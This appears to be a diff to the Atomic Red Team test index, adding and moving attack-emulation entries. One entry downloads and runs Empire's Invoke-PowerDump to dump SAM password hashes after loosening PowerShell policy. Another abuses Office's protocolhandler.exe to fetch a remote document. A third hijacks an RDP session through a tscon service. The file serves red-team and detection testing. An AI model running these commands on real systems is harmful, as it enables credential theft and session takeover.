@@ -20326,6 +20326,20 @@ credential-access:
 '
         name: command_prompt
         elevation_required: true
+    - name: PowerDump Registry dump of SAM for hashes and usernames
+      auto_generated_guid: 804f28fc-68fc-40da-b5a2-e9d0bce5c193
+      description: Executes a hashdump by reading the hasshes from the registry.
+      supported_platforms:
+      - windows
+      executor:
+        command: |-
+          Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green
+          Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
+          Invoke-Webrequest -Uri "https://github.com/BC-SECURITY/Empire/blob/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1" -UseBasicParsing -OutFile "$Env:Temp\PowerDump.ps1"
+          Import-Module .\PowerDump.ps1
+          Invoke-PowerDump
+        name: powershell
+        elevation_required: true
   T1555.002:
     technique:
       external_references:
@@ -32739,6 +32753,44 @@ defense-evasion:
 
 '
         name: command_prompt
+    - name: ProtocolHandler.exe Downloaded a Suspicious File
+      auto_generated_guid: db020456-125b-4c8b-a4a7-487df8afb5a2
+      description: 'Emulates attack via documents through protocol handler in Microsoft
+        Office.  On successful execution you should see Microsoft Word launch a blank
+        file.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        microsoft_wordpath:
+          description: path to office folder
+          type: path
+          default: C:\Program Files\Microsoft Office\Office16
+        remote_url:
+          description: url to document
+          type: url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Microsoft Word must be installed with the correct path and protocolhandler.exe
+          must be provided
+
+'
+        prereq_command: 'if (Test-Path "#{microsoft_wordpath}\protocolhandler.exe")
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'write-host "Install Microsoft Word or provide correct
+          path."
+
+'
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: '#{microsoft_wordpath}\protocolhandler.exe "ms-word:nft|u|#{remote_url}"
+
+'
   T1216:
     technique:
       id: attack-pattern--f6fe9070-7a65-49ea-ae72-76292f42cebe
@@ -44586,7 +44638,36 @@ lateral-movement:
       - SYSTEM
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1563.002
+    atomic_tests:
+    - name: RDP hijacking
+      auto_generated_guid: a37ac520-b911-458e-8aed-c5f1576d9f46
+      description: 'RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)
+        - how to hijack RDS and RemoteApp sessions transparently to move through an
+        organization
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        Session_ID:
+          description: The ID of the session to which you want to connect
+          type: String
+          default: '1337'
+        Destination_ID:
+          description: Connect the session of another user to a different session
+          type: String
+          default: rdp-tcp#55
+      executor:
+        command: |
+          query user
+          sc.exe create sesshijack binpath= "cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}"
+          net start sesshijack
+        cleanup_command: 'sc.exe delete sesshijack >nul 2>&1
+
+'
+        name: command_prompt
+        elevation_required: true
   T1021.001:
     technique:
       external_references:
@@ -44651,34 +44732,6 @@ lateral-movement:
       - Windows
       identifier: T1021.001
     atomic_tests:
-    - name: RDP hijacking
-      auto_generated_guid: a37ac520-b911-458e-8aed-c5f1576d9f46
-      description: 'RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)
-        - how to hijack RDS and RemoteApp sessions transparently to move through an
-        organization
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        Session_ID:
-          description: The ID of the session to which you want to connect
-          type: String
-          default: '1337'
-        Destination_ID:
-          description: Connect the session of another user to a different session
-          type: String
-          default: rdp-tcp#55
-      executor:
-        command: |
-          query user
-          sc.exe create sesshijack binpath= "cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}"
-          net start sesshijack
-        cleanup_command: 'sc.exe delete sesshijack >nul 2>&1
-
-'
-        name: command_prompt
-        elevation_required: true
     - name: RDPto-DomainController
       auto_generated_guid: 355d4632-8cb9-449d-91ce-b566d0253d3e
       description: 'Attempt an RDP session via Remote Desktop Application to a DomainController.
